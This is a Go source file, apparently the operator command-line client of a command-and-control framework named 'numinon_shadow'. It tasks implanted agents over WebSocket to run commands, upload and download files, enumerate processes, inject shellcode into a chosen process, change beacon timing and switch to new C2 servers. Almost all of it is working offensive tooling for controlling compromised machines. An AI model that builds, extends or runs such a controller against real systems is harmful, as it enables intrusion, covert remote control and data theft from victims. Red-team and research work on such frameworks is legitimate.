package main

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"numinon_shadow/internal/agent/config"
	"os"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"numinon_shadow/internal/clientapi"
	"numinon_shadow/internal/models"
)

const (
	defaultServerWsURL = "ws://localhost:8080/client"
)

// CommandFlags holds all possible command flags
type CommandFlags struct {
	// Connection
	ServerURL string

	// Action selection
	Action string

	// Target selection (for commands)
	AgentID string

	// Listener management
	ListenerProto string
	ListenerAddr  string
	ListenerCert  string
	ListenerKey   string
	ListenerID    string

	// Command-specific flags
	Command       string // For run_cmd
	FilePath      string // For upload/download
	SavePath      string // For download (where to save on server)
	ProcessName   string // For enumerate
	TargetPID     int    // For shellcode
	ShellcodePath string // For shellcode
	ExportName    string // For shellcode export

	// Morph parameters
	NewDelay  string
	NewJitter float64

	// Hop parameters
	HopProtocol string
	HopIP       string
	HopPort     string
}

func main() {
	flags := parseFlags()

	// Connect to server
	conn, err := connectToServer(flags.ServerURL)
	if err != nil {
		log.Fatalf("Failed to connect to server: %v", err)
	}
	defer conn.Close()

	// Start response reader
	done := make(chan struct{})
	go readResponses(conn, done)

	// Build and send request based on action
	request, err := buildRequest(flags)
	if err != nil {
		log.Fatalf("Failed to build request: %v", err)
	}

	if err := sendRequest(conn, request); err != nil {
		log.Fatalf("Failed to send request: %v", err)
	}

	// Wait for response
	select {
	case <-done:
		log.Println("Response received, exiting")
	case <-time.After(30 * time.Second):
		log.Println("Timeout waiting for response")
	}
}

func parseFlags() CommandFlags {
	var flags CommandFlags

	// Connection flags
	flag.StringVar(&flags.ServerURL, "server", defaultServerWsURL, "C2 server WebSocket URL")
	flag.StringVar(&flags.Action, "action", "", "Action to perform")

	// Agent targeting
	flag.StringVar(&flags.AgentID, "agent", "", "Target agent ID")

	// Listener management
	flag.StringVar(&flags.ListenerProto, "proto", "", "Listener protocol")
	flag.StringVar(&flags.ListenerAddr, "addr", "", "Listener address")
	flag.StringVar(&flags.ListenerCert, "cert", "", "TLS certificate path")
	flag.StringVar(&flags.ListenerKey, "key", "", "TLS key path")
	flag.StringVar(&flags.ListenerID, "id", "", "Listener ID")

	// Command flags
	flag.StringVar(&flags.Command, "cmd", "", "Command to execute (for run_cmd)")
	flag.StringVar(&flags.FilePath, "file", "", "File path (for upload/download)")
	flag.StringVar(&flags.SavePath, "save", "", "Save path (for download)")
	flag.StringVar(&flags.ProcessName, "process", "", "Process name (for enumerate)")
	flag.IntVar(&flags.TargetPID, "pid", 0, "Target PID (for shellcode)")
	flag.StringVar(&flags.ShellcodePath, "shellcode", "", "Shellcode file path")
	flag.StringVar(&flags.ExportName, "export", "", "Export name for shellcode")

	// Morph flags
	flag.StringVar(&flags.NewDelay, "delay", "", "New delay (for morph)")
	flag.Float64Var(&flags.NewJitter, "jitter", -1, "New jitter (for morph)")

	// Hop flags
	flag.StringVar(&flags.HopProtocol, "hop-proto", "", "New protocol (for hop)")
	flag.StringVar(&flags.HopIP, "hop-ip", "", "New server IP (for hop)")
	flag.StringVar(&flags.HopPort, "hop-port", "", "New server port (for hop)")

	flag.Parse()

	if flags.Action == "" {
		fmt.Println("Error: -action flag is required")
		fmt.Println("\nAvailable actions:")
		fmt.Println("  Listener Management:")
		fmt.Println("    create-listener  - Create a new listener")
		fmt.Println("    list-listeners   - List all listeners")
		fmt.Println("    stop-listener    - Stop a listener")
		fmt.Println("\n  Agent Commands:")
		fmt.Println("    task-runcmd      - Execute a command")
		fmt.Println("    task-upload      - Upload a file")
		fmt.Println("    task-download    - Download a file")
		fmt.Println("    task-shellcode   - Execute shellcode")
		fmt.Println("    task-enumerate   - Enumerate processes")
		fmt.Println("    task-morph       - Change agent parameters")
		fmt.Println("    task-hop         - Change agent connection")
		fmt.Println("\n  Agent Management:")
		fmt.Println("    list-agents      - List all agents")
		fmt.Println("    agent-details    - Get agent details")
		os.Exit(1)
	}

	return flags
}

func buildRequest(flags CommandFlags) (clientapi.ClientRequest, error) {
	request := clientapi.ClientRequest{
		RequestID: "cli_" + uuid.New().String()[:8],
	}

	switch flags.Action {
	// Listener management (already exists, keep as is)
	case "create-listener":
		request.Action = clientapi.ActionCreateListener
		payload := clientapi.CreateListenerPayload{
			Protocol: flags.ListenerProto,
			Address:  flags.ListenerAddr,
			CertPath: flags.ListenerCert,
			KeyPath:  flags.ListenerKey,
		}
		payloadBytes, _ := json.Marshal(payload)
		request.Payload = payloadBytes

	case "list-listeners":
		request.Action = clientapi.ActionListListeners
		request.Payload = json.RawMessage("{}")

	case "stop-listener":
		request.Action = clientapi.ActionStopListener
		payload := clientapi.StopListenerPayload{
			ListenerID: flags.ListenerID,
		}
		payloadBytes, _ := json.Marshal(payload)
		request.Payload = payloadBytes

	// Agent management
	case "list-agents":
		request.Action = clientapi.ActionListAgents
		request.Payload = json.RawMessage("{}")

	case "agent-details":
		request.Action = clientapi.ActionGetAgentDetails
		payload := clientapi.GetAgentDetailsPayload{
			AgentID: flags.AgentID,
		}
		payloadBytes, _ := json.Marshal(payload)
		request.Payload = payloadBytes

	// Task commands
	case "task-runcmd":
		if flags.AgentID == "" || flags.Command == "" {
			return request, fmt.Errorf("run_cmd requires -agent and -cmd flags")
		}
		request.Action = clientapi.ActionTaskAgentRunCmd

		// Build the command arguments
		cmdArgs := models.RunCmdArgs{
			CommandLine: flags.Command,
		}

		// Wrap in TaskAgentPayload
		payload := clientapi.TaskAgentPayload{
			AgentID: flags.AgentID,
			Args:    cmdArgs,
		}
		payloadBytes, _ := json.Marshal(payload)
		request.Payload = payloadBytes

	case "task-upload":
		if flags.AgentID == "" || flags.FilePath == "" {
			return request, fmt.Errorf("upload requires -agent and -file flags")
		}
		request.Action = clientapi.ActionTaskAgentUploadFile

		// Read the file to upload
		fileContent, err := ioutil.ReadFile(flags.FilePath)
		if err != nil {
			return request, fmt.Errorf("failed to read file %s: %v", flags.FilePath, err)
		}

		// Calculate hash
		hash := calculateSHA256(fileContent)

		// Build upload arguments
		uploadArgs := models.UploadArgs{
			TargetDirectory:   getTargetDirectory(flags.SavePath),
			TargetFilename:    getFileName(flags.FilePath),
			FileContentBase64: base64.StdEncoding.EncodeToString(fileContent),
			ExpectedSha256:    hash,
			OverwriteIfExists: true,
		}

		payload := clientapi.TaskAgentPayload{
			AgentID: flags.AgentID,
			Args:    uploadArgs,
		}
		payloadBytes, _ := json.Marshal(payload)
		request.Payload = payloadBytes

	case "task-download":
		if flags.AgentID == "" || flags.FilePath == "" {
			return request, fmt.Errorf("download requires -agent and -file flags")
		}
		request.Action = clientapi.ActionTaskAgentDownloadFile

		downloadArgs := models.DownloadArgs{
			SourceFilePath: flags.FilePath,
		}

		payload := clientapi.TaskAgentPayload{
			AgentID: flags.AgentID,
			Args:    downloadArgs,
		}
		payloadBytes, _ := json.Marshal(payload)
		request.Payload = payloadBytes

	case "task-enumerate":
		if flags.AgentID == "" {
			return request, fmt.Errorf("enumerate requires -agent flag")
		}
		request.Action = clientapi.ActionTaskAgentEnumerateProcs

		enumArgs := models.EnumerateArgs{
			ProcessName: flags.ProcessName, // Can be empty for all processes
		}

		payload := clientapi.TaskAgentPayload{
			AgentID: flags.AgentID,
			Args:    enumArgs,
		}
		payloadBytes, _ := json.Marshal(payload)
		request.Payload = payloadBytes

	case "task-morph":
		if flags.AgentID == "" {
			return request, fmt.Errorf("morph requires -agent flag")
		}
		request.Action = clientapi.ActionTaskAgentMorph

		morphArgs := models.MorphArgs{}
		if flags.NewDelay != "" {
			morphArgs.NewDelay = &flags.NewDelay
		}
		if flags.NewJitter >= 0 {
			morphArgs.NewJitter = &flags.NewJitter
		}

		payload := clientapi.TaskAgentPayload{
			AgentID: flags.AgentID,
			Args:    morphArgs,
		}
		payloadBytes, _ := json.Marshal(payload)
		request.Payload = payloadBytes

	case "task-hop":
		if flags.AgentID == "" || flags.HopProtocol == "" ||
			flags.HopIP == "" || flags.HopPort == "" {
			return request, fmt.Errorf("hop requires -agent, -hop-proto, -hop-ip, and -hop-port flags")
		}
		request.Action = clientapi.ActionTaskAgentHop

		// Map string protocol to config.AgentProtocol
		hopArgs := models.HopArgs{
			NewProtocol:   mapToAgentProtocol(flags.HopProtocol),
			NewServerIP:   flags.HopIP,
			NewServerPort: flags.HopPort,
		}

		payload := clientapi.TaskAgentPayload{
			AgentID: flags.AgentID,
			Args:    hopArgs,
		}
		payloadBytes, _ := json.Marshal(payload)
		request.Payload = payloadBytes

	case "task-shellcode":
		if flags.AgentID == "" || flags.ShellcodePath == "" {
			return request, fmt.Errorf("shellcode requires -agent and -shellcode flags")
		}
		request.Action = clientapi.ActionTaskAgentExecuteShellcode

		// Read shellcode file
		shellcodeContent, err := ioutil.ReadFile(flags.ShellcodePath)
		if err != nil {
			return request, fmt.Errorf("failed to read shellcode file: %v", err)
		}

		shellcodeArgs := models.ShellcodeArgs{
			ShellcodeBase64: base64.StdEncoding.EncodeToString(shellcodeContent),
			TargetPID:       uint32(flags.TargetPID),
			ExportName:      flags.ExportName,
		}

		payload := clientapi.TaskAgentPayload{
			AgentID: flags.AgentID,
			Args:    shellcodeArgs,
		}
		payloadBytes, _ := json.Marshal(payload)
		request.Payload = payloadBytes

	default:
		return request, fmt.Errorf("unknown action: %s", flags.Action)
	}

	return request, nil
}

func connectToServer(serverURL string) (*websocket.Conn, error) {
	log.Printf("Connecting to %s", serverURL)
	conn, _, err := websocket.DefaultDialer.Dial(serverURL, nil)
	if err != nil {
		return nil, err
	}
	log.Println("Connected to server")
	return conn, nil
}

func sendRequest(conn *websocket.Conn, request clientapi.ClientRequest) error {
	reqBytes, err := json.Marshal(request)
	if err != nil {
		return fmt.Errorf("failed to marshal request: %v", err)
	}

	log.Printf("Sending request: %s", request.Action)
	return conn.WriteMessage(websocket.TextMessage, reqBytes)
}

func readResponses(conn *websocket.Conn, done chan struct{}) {
	defer close(done)

	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Printf("Read error: %v", err)
			return
		}

		// Parse and display response
		var response clientapi.ServerResponse
		if err := json.Unmarshal(message, &response); err != nil {
			log.Printf("Failed to parse response: %v", err)
			continue
		}

		displayResponse(response)
	}
}

func displayResponse(response clientapi.ServerResponse) {
	fmt.Println("\n==== Server Response ====")
	fmt.Printf("Status: %s\n", response.Status)

	if response.Error != "" {
		fmt.Printf("Error: %s\n", response.Error)
	}

	// Display payload based on data type
	switch response.DataType {
	case clientapi.DataTypeTaskQueuedConfirmation:
		var confirmation clientapi.TaskQueuedConfirmationPayload
		if json.Unmarshal(response.Payload, &confirmation) == nil {
			fmt.Printf("Task Queued: %s\n", confirmation.TaskID)
			fmt.Printf("Agent: %s\n", confirmation.AgentID)
			fmt.Printf("Message: %s\n", confirmation.Message)
		}

	case clientapi.DataTypeCommandResult:
		var result clientapi.TaskResultEventPayload
		if json.Unmarshal(response.Payload, &result) == nil {
			fmt.Printf("Task Result: %s\n", result.TaskID)
			fmt.Printf("Command: %s\n", result.CommandType)
			fmt.Printf("Success: %v\n", result.CommandSuccess)
			if result.ErrorMsg != "" {
				fmt.Printf("Error: %s\n", result.ErrorMsg)
			}

			// Display command-specific results
			displayCommandResult(result.CommandType, result.ResultData)
		}

	case clientapi.DataTypeListenerStatus:
		var status clientapi.ListenerStatusPayload
		if json.Unmarshal(response.Payload, &status) == nil {
			fmt.Printf("Listener: %s\n", status.ListenerID)
			fmt.Printf("Protocol: %s\n", status.Protocol)
			fmt.Printf("Address: %s\n", status.Address)
			fmt.Printf("Status: %s\n", status.Status)
		}

	default:
		// Display raw payload for unhandled types
		fmt.Printf("Payload: %s\n", string(response.Payload))
	}

	fmt.Println("========================")
}

func displayCommandResult(commandType string, resultData json.RawMessage) {
	switch commandType {
	case "run_cmd":
		var result models.RunCmdResult
		if json.Unmarshal(resultData, &result) == nil {
			fmt.Printf("Output:\n%s\n", string(result.CombinedOutput))
			if result.ExitCode != 0 {
				fmt.Printf("Exit Code: %d\n", result.ExitCode)
			}
		}

	case "download":
		// For download, we just show success - the file is saved server-side
		fmt.Println("File downloaded successfully")

	case "enumerate":
		var result models.EnumerateResult
		if json.Unmarshal(resultData, &result) == nil {
			fmt.Printf("Found %d processes\n", len(result.Processes))
			for _, proc := range result.Processes {
				fmt.Printf("  [%d] %s\n", proc.PID, proc.Name)
			}
		}

	default:
		// For other commands, show raw result
		fmt.Printf("Result: %s\n", string(resultData))
	}
}

// Utility functions
func calculateSHA256(content []byte) string {
	hash := sha256.Sum256(content)
	return fmt.Sprintf("%x", hash)
}

func getTargetDirectory(savePath string) string {
	if savePath == "" {
		return "C:\\Temp\\" // Default for Windows
	}
	// Extract directory from path
	lastSlash := strings.LastIndex(savePath, "\\")
	if lastSlash > 0 {
		return savePath[:lastSlash]
	}
	return savePath
}

func getFileName(filePath string) string {
	// Extract filename from path
	lastSlash := strings.LastIndex(filePath, "/")
	if lastSlash >= 0 {
		return filePath[lastSlash+1:]
	}
	lastBackslash := strings.LastIndex(filePath, "\\")
	if lastBackslash >= 0 {
		return filePath[lastBackslash+1:]
	}
	return filePath
}

func mapToAgentProtocol(proto string) config.AgentProtocol {
	switch proto {
	case "H1C":
		return config.HTTP1Clear
	case "H1TLS":
		return config.HTTP1TLS
	case "H2TLS":
		return config.HTTP2TLS
	case "H3":
		return config.HTTP3
	case "WS":
		return config.WebsocketClear
	case "WSS":
		return config.WebsocketSecure
	default:
		return config.HTTP2TLS // Default fallback
	}
}
